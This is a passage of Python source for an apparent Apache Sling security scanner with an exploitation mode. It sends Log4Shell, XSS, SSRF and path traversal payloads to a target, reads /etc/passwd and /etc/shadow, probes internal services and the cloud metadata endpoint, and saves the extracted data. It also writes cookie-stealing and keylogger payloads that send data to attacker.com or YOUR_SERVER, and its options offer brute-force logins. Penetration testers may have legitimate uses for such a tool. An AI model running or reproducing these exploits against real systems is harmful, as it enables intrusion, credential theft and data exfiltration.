            self.log("Log4Shell test configuration incomplete - missing payloads or OOB domain", "WARNING", Fore.YELLOW)
            return
        
        # Generate unique identifier for this scan
        scan_id = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
        
        # Replace ${hostName} placeholder with scan ID
        processed_payloads = [p.replace('${hostName}', scan_id) for p in payloads]
        
        # Prioritize payloads: DNS first (fastest), then LDAP, then obfuscated
        payload_priority = []
        for payload in processed_payloads:
            if 'dns://' in payload.lower():
                payload_priority.insert(0, ('dns', payload))  # DNS first
            elif 'ldap://' in payload.lower() and '${::-j}' not in payload:
                payload_priority.append(('ldap', payload))  # LDAP second
            else:
                payload_priority.append(('obfuscated', payload))  # Obfuscated last
        
        # Prioritize injection points: most common first
        headers_to_test = injection_points.get('headers', [])
        # Reorder: User-Agent and X-Forwarded-For are most commonly logged
        priority_headers = ['User-Agent', 'X-Forwarded-For', 'X-Real-IP', 'X-Forwarded-Host', 'Referer']
        ordered_headers = []
        for priority_header in priority_headers:
            if priority_header in headers_to_test:
                ordered_headers.append(priority_header)
        # Add remaining headers
        for header in headers_to_test:
            if header not in ordered_headers:
                ordered_headers.append(header)
        
        params_to_test = injection_points.get('parameters', [])
        # Prioritize common parameters
        priority_params = ['q', 'query', 'search', 'filter', 'callback']
        ordered_params = []
        for priority_param in priority_params:
            if priority_param in params_to_test:
                ordered_params.append(priority_param)
        for param in params_to_test:
            if param not in ordered_params:
                ordered_params.append(param)
        
        # Calculate total tests (optimized: fewer tests with prioritization)
        total_tests = len(test_paths) * len(payload_priority) * (len(ordered_headers) + len(ordered_params))
        if total_tests == 0:
            total_tests = 1
        tests_completed = 0
        suspicious_responses = []
        slow_responses = []
        
        # Get baseline response time for comparison
        baseline_time = None
        try:
            start_time = time.time()
            baseline_response = await self.async_request('/')
            baseline_time = time.time() - start_time
        except:
            baseline_time = 1.0  # Default baseline
        
        self.log(f"Starting optimized Log4Shell test with {total_tests} injection attempts (scan ID: {scan_id})", "INFO", Fore.CYAN)
        self.log(f"Baseline response time: {baseline_time:.2f}s", "INFO", Fore.CYAN)
        
        # Log4j error patterns to detect
        log4j_patterns = [
            r'log4j',
            r'jndi',
            r'lookup',
            r'ldap',
            r'javax\.naming',
            r'com\.sun\.jndi',
            r'java\.net\.UnknownHostException',
            r'NameNotFoundException'
        ]
        
        for path_idx, path in enumerate(test_paths):
            for payload_type, payload in payload_priority:
                # Test payload in headers (prioritized order)
                for header_name in ordered_headers:
                    custom_headers = {header_name: payload}
                    try:
                        request_start = time.time()
                        response = await self.async_request(path, headers=custom_headers)
                        request_time = time.time() - request_start
                        tests_completed += 1
                        
                        # Analyze response for Log4j indicators
                        if response:
                            # Check for slow responses (potential DNS lookup delay)
                            if request_time > baseline_time * 2 and request_time > 2.0:
                                slow_responses.append({
                                    'path': path,
                                    'header': header_name,
                                    'payload_type': payload_type,
                                    'response_time': request_time,
                                    'status': response.status
                                })
                                if self.verbose:
                                    self.log(f"Slow response detected ({request_time:.2f}s): {header_name} on {path}", "WARNING", Fore.YELLOW)
                            
                            # Check response text for Log4j error patterns
                            if response.text:
                                for pattern in log4j_patterns:
                                    if re.search(pattern, response.text, re.IGNORECASE):
                                        suspicious_responses.append({
                                            'path': path,
                                            'header': header_name,
                                            'payload_type': payload_type,
                                            'pattern': pattern,
                                            'status': response.status
                                        })
                                        self.log(f"Log4j pattern detected ({pattern}): {header_name} on {path}", "WARNING", Fore.YELLOW)
                        
                        # Rate limiting: small delay between requests
                        if tests_completed % 10 == 0:
                            await asyncio.sleep(0.1)  # 100ms delay every 10 requests
                        
                        if progress and task and tests_completed % max(1, total_tests // 20) == 0:
                            progress.update(task, advance=1, 
                                          description=f"Log4Shell: {tests_completed}/{total_tests} ({payload_type})...")
                    except Exception as e:
                        if self.verbose:
                            self.log(f"Error testing Log4Shell header {header_name}: {str(e)}", "WARNING", Fore.YELLOW)
                
                # Test payload in query parameters (prioritized order, with URL encoding)
                for param_name in ordered_params:
                    # Build URL with parameter (URL encode the payload)
                    parsed_url = urlparse(urljoin(self.target_url, path))
                    query_params = parse_qs(parsed_url.query)
                    # Try both encoded and unencoded versions
                    encoded_payload = quote(payload, safe='')
                    query_params[param_name] = [payload]  # Unencoded first
                    query_string = urlencode(query_params, doseq=True)
                    test_path = f"{parsed_url.path}?{query_string}"
                    
                    try:
                        request_start = time.time()
                        response = await self.async_request(test_path)
                        request_time = time.time() - request_start
                        tests_completed += 1
                        
                        # Analyze response
                        if response:
                            if request_time > baseline_time * 2 and request_time > 2.0:
                                slow_responses.append({
                                    'path': path,
                                    'parameter': param_name,
                                    'payload_type': payload_type,
                                    'response_time': request_time,
                                    'status': response.status
                                })
                            
                            if response.text:
                                for pattern in log4j_patterns:
                                    if re.search(pattern, response.text, re.IGNORECASE):
                                        suspicious_responses.append({
                                            'path': path,
                                            'parameter': param_name,
                                            'payload_type': payload_type,
                                            'pattern': pattern,
                                            'status': response.status
                                        })
                                        self.log(f"Log4j pattern detected ({pattern}): {param_name} on {path}", "WARNING", Fore.YELLOW)
                        
                        # Rate limiting
                        if tests_completed % 10 == 0:
                            await asyncio.sleep(0.1)
                        
                        if progress and task and tests_completed % max(1, total_tests // 20) == 0:
                            progress.update(task, advance=1,
                                          description=f"Log4Shell: {tests_completed}/{total_tests} ({payload_type})...")
                    except Exception as e:
                        if self.verbose:
                            self.log(f"Error testing Log4Shell param {param_name}: {str(e)}", "WARNING", Fore.YELLOW)
        
        # Determine severity based on findings
        severity = 'info'
        description_parts = [vuln_info.get('description', 'Remote code execution via Log4j')]
        
        if suspicious_responses or slow_responses:
            severity = 'high'  # Upgrade to high if we see indicators
            description_parts.append("⚠️ Suspicious indicators detected:")
            if suspicious_responses:
                description_parts.append(f"{len(suspicious_responses)} responses contain Log4j error patterns")
            if slow_responses:
                description_parts.append(f"{len(slow_responses)} responses show significant delays (potential DNS lookups)")
            description_parts.append("This suggests Log4j may be processing the payloads.")
        
        description_parts.append(f"OOB test performed with domain: {oob_domain}. Check your OOB listener for DNS/HTTP callbacks with scan ID: {scan_id}")
        description = ". ".join(description_parts)
        
        # Add finding with appropriate severity
        self.add_finding({
            'name': vuln_info.get('name', 'Log4Shell'),
            'severity': severity,
            'vulnerability_id': 'CVE-2021-44228',
            'description': description,
            'remediation': vuln_info.get('remediation', 'Update Log4j to version 2.15.0 or higher'),
            'test_details': {
                'oob_domain': oob_domain,
                'scan_id': scan_id,
                'test_paths': test_paths,
                'payloads_tested': len(processed_payloads),
                'injection_points_tested': len(ordered_headers) + len(ordered_params),
                'total_tests': tests_completed,
                'suspicious_responses': len(suspicious_responses),
                'slow_responses': len(slow_responses),
                'baseline_response_time': baseline_time,
                'indicators_found': bool(suspicious_responses or slow_responses),
                'note': 'Check your OOB listener (oast.fun) for incoming requests to confirm exploitation'
            }
        })
        
        summary_msg = f"Log4Shell test completed ({tests_completed} tests)"
        if suspicious_responses or slow_responses:
            summary_msg += f" - {len(suspicious_responses)} suspicious patterns, {len(slow_responses)} slow responses"
        summary_msg += f". Check OOB listener at {oob_domain} for scan ID: {scan_id}"
        
        self.log(summary_msg, "INFO", Fore.CYAN)

    async def check_xss_vulnerability(self, vuln_id: str, vuln_info: dict) -> None:
        """Test for XSS vulnerabilities with payload injection and response analysis"""
        test_paths = vuln_info.get('test_paths', vuln_info.get('path', ['/']))
        if isinstance(test_paths, str):
            test_paths = [test_paths]
        
        payloads = vuln_info.get('payloads', [])
        parameters = vuln_info.get('parameters', [])
        
        if not payloads:
            # Default XSS payloads if none specified
            payloads = ["<script>alert('XSS')</script>", "<img src=x onerror=alert(1)>"]
        
        if not parameters:
            parameters = ['q', 'query', 'search', 'property', 'value']
        
        vulnerable_paths = []
        
        for path in test_paths:
            for payload in payloads:
                for param in parameters:
                    # Test in query parameter
                    parsed_url = urlparse(urljoin(self.target_url, path))
                    query_params = parse_qs(parsed_url.query)
                    query_params[param] = [payload]
                    query_string = urlencode(query_params, doseq=True)
                    test_path = f"{parsed_url.path}?{query_string}"
                    
                    try:
                        response = await self.async_request(test_path)
                        if response and response.text:
                            # Check if payload is reflected in response (XSS indicator)
                            if payload in response.text or payload.replace("'", "&#39;") in response.text:
                                vulnerable_paths.append({
                                    'path': test_path,
                                    'parameter': param,
                                    'payload': payload,
                                    'status': response.status,
                                    'reflected': True
                                })
                                self.log(f"XSS payload reflected in response: {test_path}", "WARNING", Fore.YELLOW)
                    except Exception as e:
                        if self.verbose:
                            self.log(f"Error testing XSS: {str(e)}", "WARNING", Fore.YELLOW)
        
        if vulnerable_paths:
            exploit_results = None
            if self.exploit_mode:
                exploit_results = await self.exploit_xss(vuln_id, vulnerable_paths)
            
            self.add_finding({
                'name': vuln_info.get('name', 'XSS Vulnerability'),
                'severity': vuln_info.get('severity', 'high'),
                'vulnerability_id': vuln_id,
                'description': f"{vuln_info.get('description', 'Cross-site scripting vulnerability')}. Found {len(vulnerable_paths)} vulnerable injection points.",
                'remediation': vuln_info.get('remediation', 'Update to latest version'),
                'test_details': {
                    'vulnerable_paths': vulnerable_paths,
                    'payloads_tested': len(payloads),
                    'parameters_tested': len(parameters)
                },
                'exploit_results': exploit_results
            })

    async def check_ssrf_vulnerability(self, vuln_id: str, vuln_info: dict) -> None:
        """Test for SSRF vulnerabilities"""
        test_paths = vuln_info.get('test_paths', vuln_info.get('path', ['/']))
        if isinstance(test_paths, str):
            test_paths = [test_paths]
        
        payloads = vuln_info.get('payloads', [])
        parameters = vuln_info.get('parameters', ['url', 'path', 'resource'])
        
        if not payloads:
            payloads = ["http://127.0.0.1:80", "file:///etc/passwd"]
        
        vulnerable_paths = []
        
        for path in test_paths:
            for payload in payloads:
                for param in parameters:
                    parsed_url = urlparse(urljoin(self.target_url, path))
                    query_params = parse_qs(parsed_url.query)
                    query_params[param] = [payload]
                    query_string = urlencode(query_params, doseq=True)
                    test_path = f"{parsed_url.path}?{query_string}"
                    
                    try:
                        response = await self.async_request(test_path)
                        if response:
                            # Check for SSRF indicators
                            response_text = response.text.lower()
                            ssrf_indicators = ['127.0.0.1', 'localhost', 'file://', 'internal', 'private']
                            
                            if any(indicator in response_text for indicator in ssrf_indicators):
                                vulnerable_paths.append({
                                    'path': test_path,
                                    'parameter': param,
                                    'payload': payload,
                                    'status': response.status,
                                    'indicator_found': True
                                })
                                self.log(f"SSRF indicator found: {test_path}", "WARNING", Fore.YELLOW)
                    except Exception as e:
                        if self.verbose:
                            self.log(f"Error testing SSRF: {str(e)}", "WARNING", Fore.YELLOW)
        
        if vulnerable_paths:
            exploit_results = None
            if self.exploit_mode:
                exploit_results = await self.exploit_ssrf(vuln_id, vulnerable_paths)
            
            self.add_finding({
                'name': vuln_info.get('name', 'SSRF Vulnerability'),
                'severity': vuln_info.get('severity', 'high'),
                'vulnerability_id': vuln_id,
                'description': f"{vuln_info.get('description', 'Server-Side Request Forgery vulnerability')}. Found {len(vulnerable_paths)} potential SSRF points.",
                'remediation': vuln_info.get('remediation', 'Update to latest version'),
                'test_details': {
                    'vulnerable_paths': vulnerable_paths,
                    'payloads_tested': len(payloads)
                },
                'exploit_results': exploit_results
            })

    async def check_path_traversal_vulnerability(self, vuln_id: str, vuln_info: dict) -> None:
        """Test for path traversal vulnerabilities"""
        test_paths = vuln_info.get('test_paths', vuln_info.get('path', ['/']))
        if isinstance(test_paths, str):
            test_paths = [test_paths]
        
        payloads = vuln_info.get('payloads', [])
        parameters = vuln_info.get('parameters', ['path', 'file', 'resource'])
        
        if not payloads:
            payloads = ["../../../etc/passwd", "....//....//....//etc/passwd"]
        
        vulnerable_paths = []
        sensitive_patterns = [r'/etc/passwd', r'/etc/shadow', r'root:', r'bin/bash']
        
        for path in test_paths:
            for payload in payloads:
                for param in parameters:
                    parsed_url = urlparse(urljoin(self.target_url, path))
                    query_params = parse_qs(parsed_url.query)
                    query_params[param] = [payload]
                    query_string = urlencode(query_params, doseq=True)
                    test_path = f"{parsed_url.path}?{query_string}"
                    
                    try:
                        response = await self.async_request(test_path)
                        if response and response.text:
                            # Check for sensitive file content
                            for pattern in sensitive_patterns:
                                if re.search(pattern, response.text, re.IGNORECASE):
                                    vulnerable_paths.append({
                                        'path': test_path,
                                        'parameter': param,
                                        'payload': payload,
                                        'status': response.status,
                                        'pattern_matched': pattern
                                    })
                                    self.log(f"Path traversal detected: {test_path} (matched: {pattern})", "WARNING", Fore.YELLOW)
                                    break
                    except Exception as e:
                        if self.verbose:
                            self.log(f"Error testing path traversal: {str(e)}", "WARNING", Fore.YELLOW)
        
        if vulnerable_paths:
            exploit_results = None
            if self.exploit_mode:
                exploit_results = await self.exploit_path_traversal(vuln_id, vulnerable_paths)
            
            self.add_finding({
                'name': vuln_info.get('name', 'Path Traversal Vulnerability'),
                'severity': vuln_info.get('severity', 'high'),
                'vulnerability_id': vuln_id,
                'description': f"{vuln_info.get('description', 'Path traversal vulnerability')}. Found {len(vulnerable_paths)} vulnerable paths.",
                'remediation': vuln_info.get('remediation', 'Update to latest version'),
                'test_details': {
                    'vulnerable_paths': vulnerable_paths,
                    'payloads_tested': len(payloads)
                },
                'exploit_results': exploit_results
            })

    async def check_info_disclosure_vulnerability(self, vuln_id: str, vuln_info: dict) -> None:
        """Test for information disclosure vulnerabilities"""
        test_paths = vuln_info.get('test_paths', vuln_info.get('path', ['/']))
        if isinstance(test_paths, str):
            test_paths = [test_paths]
        
        check_patterns = vuln_info.get('check_patterns', [])
        
        if not check_patterns:
            check_patterns = [r'java\.version', r'os\.name', r'user\.home']
        
        vulnerable_paths = []
        
        for path in test_paths:
            try:
                response = await self.async_request(path)
                if response and response.text:
                    for pattern in check_patterns:
                        if re.search(pattern, response.text, re.IGNORECASE):
                            vulnerable_paths.append({
                                'path': path,
                                'status': response.status,
                                'pattern_matched': pattern
                            })
                            self.log(f"Information disclosure detected: {path} (matched: {pattern})", "WARNING", Fore.YELLOW)
            except Exception as e:
                if self.verbose:
                    self.log(f"Error testing info disclosure: {str(e)}", "WARNING", Fore.YELLOW)
        
        if vulnerable_paths:
            exploit_results = None
            if self.exploit_mode:
                exploit_results = await self.exploit_info_disclosure(vuln_id, vulnerable_paths)
            
            self.add_finding({
                'name': vuln_info.get('name', 'Information Disclosure'),
                'severity': vuln_info.get('severity', 'medium'),
                'vulnerability_id': vuln_id,
                'description': f"{vuln_info.get('description', 'Information disclosure vulnerability')}. Found {len(vulnerable_paths)} paths exposing sensitive information.",
                'remediation': vuln_info.get('remediation', 'Update to latest version'),
                'test_details': {
                    'vulnerable_paths': vulnerable_paths,
                    'patterns_checked': check_patterns
                },
                'exploit_results': exploit_results
            })

    async def check_generic_vulnerability(self, vuln_id: str, vuln_info: dict) -> None:
        """Generic vulnerability check with response analysis"""
        path = vuln_info.get('path')
        test_paths = vuln_info.get('test_paths', [path] if path else [])
        
        if not test_paths:
            return
        
        if isinstance(test_paths, str):
            test_paths = [test_paths]
        
        for test_path in test_paths:
            try:
                response = await self.async_request(test_path)
                if response:
                    # Check if endpoint is accessible
                    if response.status == 200:
                        # Analyze response for vulnerability indicators
                        indicators = []
                        response_text = response.text.lower()
                        
                        # Check for error messages that might indicate vulnerability
                        error_patterns = ['error', 'exception', 'stack trace', 'java.lang']
                        if any(pattern in response_text for pattern in error_patterns):
                            indicators.append('Error messages in response')
                        
                        # Check response size (very large might indicate data dump)
                        if len(response.text) > 100000:
                            indicators.append('Unusually large response')
                        
                        finding_desc = vuln_info.get('description', 'Potential vulnerability')
                        if indicators:
                            finding_desc += f". Indicators: {', '.join(indicators)}"
                        
                        self.add_finding({
                            'name': vuln_info.get('name', 'Vulnerability'),
                            'severity': vuln_info.get('severity', 'medium'),
                            'vulnerability_id': vuln_id,
                            'path': test_path,
                            'description': finding_desc,
                            'remediation': vuln_info.get('remediation', 'Update to latest version'),
                            'test_details': {
                                'status': response.status,
                                'content_length': len(response.text),
                                'indicators': indicators
                            }
                        })
            except Exception as e:
                if self.verbose:
                    self.log(f"Error checking vulnerability {vuln_id}: {str(e)}", "WARNING", Fore.YELLOW)

    async def exploit_xss(self, vuln_id: str, vulnerable_paths: List[dict]) -> dict:
        """Generate XSS proof-of-concept exploits"""
        self.log(f"Generating XSS PoC exploits for {vuln_id}...", "INFO", Fore.CYAN)
        
        exploit_dir = Path(self.output_dir) / datetime.now().strftime("%Y%m%d_%H%M%S") / "exploits" / vuln_id
        exploit_dir.mkdir(parents=True, exist_ok=True)
        
        poc_files = []
        for idx, vuln_path in enumerate(vulnerable_paths[:5]):  # Limit to first 5
            # Generate HTML PoC file
            poc_content = f"""<!DOCTYPE html>
<html>
<head>
    <title>XSS PoC - {vuln_id}</title>
    <style>
        body {{ font-family: Arial, sans-serif; margin: 20px; }}
        .exploit {{ background: #f0f0f0; padding: 15px; border-radius: 5px; margin: 10px 0; }}
        .payload {{ background: #fff; padding: 10px; border: 1px solid #ddd; }}
    </style>
</head>
<body>
    <h1>XSS Proof of Concept - {vuln_id}</h1>
    <div class="exploit">
        <h2>Vulnerable Endpoint</h2>
        <p><strong>Path:</strong> {vuln_path.get('path', 'N/A')}</p>
        <p><strong>Parameter:</strong> {vuln_path.get('parameter', 'N/A')}</p>
        <p><strong>Status:</strong> {vuln_path.get('status', 'N/A')}</p>
        
        <h2>Payload Used</h2>
        <div class="payload">{vuln_path.get('payload', 'N/A')}</div>
        
        <h2>Exploit URL</h2>
        <p><a href="{self.target_url}{vuln_path.get('path', '')}" target="_blank">{self.target_url}{vuln_path.get('path', '')}</a></p>
        
        <h2>Instructions</h2>
        <ol>
            <li>Click the exploit URL above</li>
            <li>If the payload executes, you should see an alert or the payload reflected in the page</li>
            <li>This confirms the XSS vulnerability is exploitable</li>
        </ol>
        
        <h2>Cookie Stealing Payload (Advanced)</h2>
        <div class="payload">
            &lt;script&gt;document.location='http://attacker.com/steal?cookie='+document.cookie&lt;/script&gt;
        </div>
        <p><strong>Note:</strong> Replace 'attacker.com' with your own server to capture cookies.</p>
    </div>
</body>
</html>"""
            
            poc_file = exploit_dir / f"xss_poc_{idx + 1}.html"
            with open(poc_file, 'w', encoding='utf-8') as f:
                f.write(poc_content)
            poc_files.append(str(poc_file))
            
            # Generate JavaScript payload file
            js_payload = f"""// XSS Payload for {vuln_id}
// Vulnerable Path: {vuln_path.get('path', 'N/A')}
// Parameter: {vuln_path.get('parameter', 'N/A')}

// Basic alert payload
const basicPayload = "{vuln_path.get('payload', '')}";

// Cookie stealing payload
const cookieStealer = "<script>document.location='http://YOUR_SERVER/steal?cookie='+document.cookie</script>";

// Keylogger payload (example)
const keylogger = `<script>
    document.onkeypress = function(e) {{
        fetch('http://YOUR_SERVER/keylog?key=' + e.key);
    }}
</script>`;

// Usage: Inject any of these payloads into the vulnerable parameter
console.log("Basic Payload:", basicPayload);
console.log("Cookie Stealer:", cookieStealer);
console.log("Keylogger:", keylogger);
"""
            
            js_file = exploit_dir / f"payload_{idx + 1}.js"
            with open(js_file, 'w', encoding='utf-8') as f:
                f.write(js_payload)
        
        self.log(f"Generated {len(poc_files)} XSS PoC files in {exploit_dir}", "INFO", Fore.GREEN)
        
        return {
            'exploit_type': 'xss_poc',
            'poc_files': poc_files,
            'exploit_dir': str(exploit_dir),
            'vulnerable_paths_exploited': len(vulnerable_paths),
            'note': 'PoC HTML files generated. Open them in a browser to test the XSS vulnerability.'
        }

    async def exploit_ssrf(self, vuln_id: str, vulnerable_paths: List[dict]) -> dict:
        """Exploit SSRF vulnerabilities by accessing internal resources"""
        self.log(f"Attempting SSRF exploitation for {vuln_id}...", "INFO", Fore.CYAN)
        
        exploit_results = {
            'exploit_type': 'ssrf',
            'internal_resources_accessed': [],
            'failed_attempts': []
        }
        
        # Common internal resources to test
        internal_targets = [
            'http://127.0.0.1:4502/system/console',
            'http://127.0.0.1:80',
            'http://localhost/system/console',
            'http://127.0.0.1:8080',
            'file:///etc/passwd',
            'file:///etc/shadow',
            'http://169.254.169.254/latest/meta-data/',  # AWS metadata
            'http://127.0.0.1:5984/_all_dbs',  # CouchDB
            'http://127.0.0.1:9200',  # Elasticsearch
        ]
        
        for vuln_path in vulnerable_paths[:3]:  # Limit to first 3
            path = vuln_path.get('path', '')
            param = vuln_path.get('parameter', 'url')
            
            for target in internal_targets[:5]:  # Test first 5 targets
                try:
                    parsed_url = urlparse(path)
                    query_params = parse_qs(parsed_url.query)
                    query_params[param] = [target]
                    query_string = urlencode(query_params, doseq=True)
                    exploit_path = f"{parsed_url.path}?{query_string}"
                    
                    response = await self.async_request(exploit_path)
                    if response:
                        if response.status == 200 and len(response.text) > 0:
                            exploit_results['internal_resources_accessed'].append({
                                'target': target,
                                'path': exploit_path,
                                'status': response.status,
                                'response_length': len(response.text),
                                'response_preview': response.text[:200] if response.text else ''
                            })
                            self.log(f"SSRF Success: Accessed {target} via {exploit_path}", "WARNING", Fore.RED)
                        else:
                            exploit_results['failed_attempts'].append({
                                'target': target,
                                'path': exploit_path,
                                'status': response.status
                            })
                except Exception as e:
                    if self.verbose:
                        self.log(f"SSRF exploit attempt failed for {target}: {str(e)}", "WARNING", Fore.YELLOW)
        
        if exploit_results['internal_resources_accessed']:
            self.log(f"SSRF exploitation successful: {len(exploit_results['internal_resources_accessed'])} internal resources accessed", "WARNING", Fore.RED)
        else:
            self.log("SSRF exploitation attempted but no internal resources accessed", "INFO", Fore.YELLOW)
        
        return exploit_results

    async def exploit_path_traversal(self, vuln_id: str, vulnerable_paths: List[dict]) -> dict:
        """Exploit path traversal vulnerabilities by reading sensitive files"""
        self.log(f"Attempting path traversal exploitation for {vuln_id}...", "INFO", Fore.CYAN)
        
        exploit_results = {
            'exploit_type': 'path_traversal',
            'files_read': [],
            'failed_attempts': []
        }
        
        # Sensitive files to attempt reading
        sensitive_files = [
            '../../../etc/passwd',
            '....//....//....//etc/passwd',
            '../../../etc/shadow',
            '../../../etc/hosts',
            '../../../windows/win.ini',
            '../../../boot.ini',
            '../../../../etc/passwd',
            '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
        ]
        
        exploit_dir = Path(self.output_dir) / datetime.now().strftime("%Y%m%d_%H%M%S") / "exploits" / vuln_id
        exploit_dir.mkdir(parents=True, exist_ok=True)
        
        for vuln_path in vulnerable_paths[:3]:  # Limit to first 3
            path = vuln_path.get('path', '')
            param = vuln_path.get('parameter', 'path')
            
            for file_path in sensitive_files[:5]:  # Test first 5 files
                try:
                    parsed_url = urlparse(path)
                    query_params = parse_qs(parsed_url.query)
                    query_params[param] = [file_path]
                    query_string = urlencode(query_params, doseq=True)
                    exploit_path = f"{parsed_url.path}?{query_string}"
                    
                    response = await self.async_request(exploit_path)
                    if response and response.status == 200:
                        # Check if we got file content (not an error page)
                        response_text = response.text.lower()
                        if any(indicator in response_text for indicator in ['root:', '/bin/', '/usr/', 'windows', '[boot loader]']):
                            file_content = response.text
                            exploit_results['files_read'].append({
                                'file_path': file_path,
                                'exploit_path': exploit_path,
                                'content_length': len(file_content),
                                'content_preview': file_content[:500]
                            })
                            
                            # Save file content
                            safe_filename = file_path.replace('../', '').replace('/', '_').replace('\\', '_')
                            output_file = exploit_dir / f"extracted_{safe_filename}.txt"
                            with open(output_file, 'w', encoding='utf-8', errors='ignore') as f:
                                f.write(file_content)
                            
                            self.log(f"Path Traversal Success: Read file {file_path} (saved to {output_file})", "WARNING", Fore.RED)
                        else:
                            exploit_results['failed_attempts'].append({
                                'file_path': file_path,
                                'exploit_path': exploit_path,
                                'reason': 'No file content detected'
                            })
                except Exception as e:
                    if self.verbose:
                        self.log(f"Path traversal exploit attempt failed for {file_path}: {str(e)}", "WARNING", Fore.YELLOW)
        
        if exploit_results['files_read']:
            self.log(f"Path traversal exploitation successful: {len(exploit_results['files_read'])} files read", "WARNING", Fore.RED)
            exploit_results['exploit_dir'] = str(exploit_dir)
        else:
            self.log("Path traversal exploitation attempted but no files read", "INFO", Fore.YELLOW)
        
        return exploit_results

    async def exploit_info_disclosure(self, vuln_id: str, vulnerable_paths: List[dict]) -> dict:
        """Extract and save disclosed information"""
        self.log(f"Extracting disclosed information for {vuln_id}...", "INFO", Fore.CYAN)
        
        exploit_results = {
            'exploit_type': 'info_disclosure',
            'information_extracted': [],
            'extracted_data': {}
        }
        
        exploit_dir = Path(self.output_dir) / datetime.now().strftime("%Y%m%d_%H%M%S") / "exploits" / vuln_id
        exploit_dir.mkdir(parents=True, exist_ok=True)
        
        for vuln_path in vulnerable_paths:
            path = vuln_path.get('path', '')
            pattern = vuln_path.get('pattern_matched', '')
            
            try:
                response = await self.async_request(path)
                if response and response.text:
                    # Extract information based on patterns
                    extracted_info = {}
                    
                    # Extract Java version
                    java_version_match = re.search(r'java\.version[=:]\s*([^\s\n]+)', response.text, re.IGNORECASE)
                    if java_version_match:
                        extracted_info['java_version'] = java_version_match.group(1)
                    
                    # Extract OS name
                    os_match = re.search(r'os\.name[=:]\s*([^\s\n]+)', response.text, re.IGNORECASE)
                    if os_match:
                        extracted_info['os_name'] = os_match.group(1)
                    
                    # Extract user home
                    user_home_match = re.search(r'user\.home[=:]\s*([^\s\n]+)', response.text, re.IGNORECASE)
                    if user_home_match:
                        extracted_info['user_home'] = user_home_match.group(1)
                    
                    # Extract Java home
                    java_home_match = re.search(r'java\.home[=:]\s*([^\s\n]+)', response.text, re.IGNORECASE)
                    if java_home_match:
                        extracted_info['java_home'] = java_home_match.group(1)
                    
                    if extracted_info:
                        exploit_results['information_extracted'].append({
                            'path': path,
                            'pattern': pattern,
                            'extracted_info': extracted_info
                        })
                        
                        # Merge into main extracted data
                        exploit_results['extracted_data'].update(extracted_info)
                        
                        # Save full response
                        safe_filename = path.replace('/', '_').replace('?', '_').replace('=', '_')
                        output_file = exploit_dir / f"disclosure_{safe_filename}.txt"
                        with open(output_file, 'w', encoding='utf-8', errors='ignore') as f:
                            f.write(f"Path: {path}\n")
                            f.write(f"Pattern Matched: {pattern}\n")
                            f.write(f"Extracted Information:\n{json.dumps(extracted_info, indent=2)}\n\n")
                            f.write("Full Response:\n")
                            f.write(response.text)
                        
                        self.log(f"Information extracted from {path}: {', '.join(extracted_info.keys())}", "WARNING", Fore.YELLOW)
            except Exception as e:
                if self.verbose:
                    self.log(f"Error extracting information from {path}: {str(e)}", "WARNING", Fore.YELLOW)
        
        if exploit_results['information_extracted']:
            # Save summary
            summary_file = exploit_dir / "extracted_info_summary.json"
            with open(summary_file, 'w', encoding='utf-8') as f:
                json.dump(exploit_results['extracted_data'], f, indent=2)
            
            self.log(f"Information disclosure exploitation: {len(exploit_results['information_extracted'])} paths analyzed, data saved to {exploit_dir}", "INFO", Fore.GREEN)
            exploit_results['exploit_dir'] = str(exploit_dir)
        else:
            self.log("No additional information extracted", "INFO", Fore.YELLOW)
        
        return exploit_results

    async def check_exposed_apis_full(self, task, progress) -> None:
        """Check for exposed APIs and services"""
        progress.update(task, advance=30, description="Checking API endpoints...")
        
        api_endpoints = self.config.get('paths', {}).get('api_endpoints', [])
        for endpoint in api_endpoints:
            response = await self.async_request(endpoint['path'])
            if response and response.status == 200:
                self.results['exposed_apis'].append({
                    'name': endpoint['name'],
                    'path': endpoint['path'],
                    'severity': endpoint['severity']
                })
        
        progress.update(task, advance=70, description="API enumeration complete")

    async def check_configuration_full(self, task, progress) -> None:
        """Check for configuration issues"""
        progress.update(task, advance=30, description="Checking OSGI configuration...")
        
        if self.config['security_checks']['configuration']['check_dispatcher']:
            # Check dispatcher configuration
            response = await self.async_request('/dispatcher/invalidate.cache')
            if response and response.status == 200:
                self.add_finding({
                    'name': 'Exposed Dispatcher Configuration',
                    'severity': 'high',
                    'description': 'Dispatcher invalidation endpoint is accessible'
                })
        
        progress.update(task, advance=70, description="Configuration audit complete")

    async def check_content_security(self, task, progress) -> None:
        """Check for content security issues"""
        progress.update(task, advance=30, description="Checking sensitive content...")
        
        sensitive_paths = self.config.get('paths', {}).get('sensitive_paths', [])
        for path_info in sensitive_paths:
            if path_info['path'] not in self.config['security_checks']['content_security']['exclude_paths']:
                response = await self.async_request(f"{path_info['path']}.json")
                if response and response.status == 200:
                    self.add_finding({
                        'name': f'Exposed Sensitive Content: {path_info["name"]}',
                        'severity': path_info['severity'],
                        'path': path_info['path'],
                        'description': f'Sensitive path {path_info["path"]} is publicly accessible'
                    })
        
        progress.update(task, advance=70, description="Content security scan complete")

def main():
    """Enhanced main entry point with better argument handling"""
    parser = argparse.ArgumentParser(
        description='Apache Sling Security Auditor',
        formatter_class=argparse.RawDescriptionHelpFormatter
    )
    
    # Add command line arguments
    parser.add_argument('-t', '--target', required=True,
                      help='Target URL (e.g., http://example.com:4502)')
    parser.add_argument('-u', '--username',
                      help='Username for authentication')
    parser.add_argument('-p', '--password',
                      help='Password for authentication')
    parser.add_argument('-o', '--output',
                      help='Output directory for scan results')
    parser.add_argument('-T', '--timeout', type=int, default=10,
                      help='Request timeout in seconds')
    parser.add_argument('-k', '--insecure', action='store_true',
                      help='Allow insecure SSL connections')
    parser.add_argument('-v', '--verbose', action='store_true',
                      help='Enable verbose output')
    parser.add_argument('--threads', type=int, default=5,
                      help='Number of concurrent threads')
    parser.add_argument('--proxy',
                      help='Proxy URL (e.g., http://127.0.0.1:8080)')
    parser.add_argument('--mode', choices=['quick', 'full', 'stealth'],
                      default='full',
                      help='Scan mode: quick, full, or stealth')
    parser.add_argument('--user-agent',
                      help='Custom User-Agent string')
    parser.add_argument('--cookies',
                      help='Cookies to include with requests')
    parser.add_argument('--wordlist',
                      help='Path to a custom wordlist file for path enumeration')
    parser.add_argument('--exploit', action='store_true',
                      help='Enable exploitation mode - attempt to exploit detected vulnerabilities')
    parser.add_argument('--brute-force', action='store_true',
                      help='Enable brute force login testing')
    parser.add_argument('--username-wordlist',
                      help='Path to username wordlist file for brute force attacks')
